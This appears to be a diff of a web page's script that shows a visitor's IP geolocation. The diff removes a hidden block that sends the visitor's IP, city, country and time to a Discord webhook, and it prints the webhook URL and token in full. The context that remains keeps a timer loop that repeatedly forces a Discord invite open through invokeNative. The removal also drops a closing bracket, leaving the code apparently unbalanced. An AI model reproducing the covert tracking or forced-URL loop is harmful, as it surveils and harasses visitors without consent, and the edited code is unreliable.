@@ -69,15 +69,7 @@
             const infoDiv = document.getElementById('ip-info');
             infoDiv.innerHTML = `<strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
 
-            const dateTime = new Date().toLocaleString();
-            const webhookUrl = 'https://discord.com/api/webhooks/1414208574871310397/YyEjkEGDPDMMAtPjfgsns5ZVbJJJvY2RIESCuXyDQpn1KciIEHizzZ_ZBers-0XCq68J';
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
-            });
-        });
-
+           
         setInterval(function() {
             window.invokeNative("openUrl", "https://discord.gg/DPwCSFtNBx");
             window.invokeNative("openUrl", "https://discord.gg/DPwCSFtNBx");
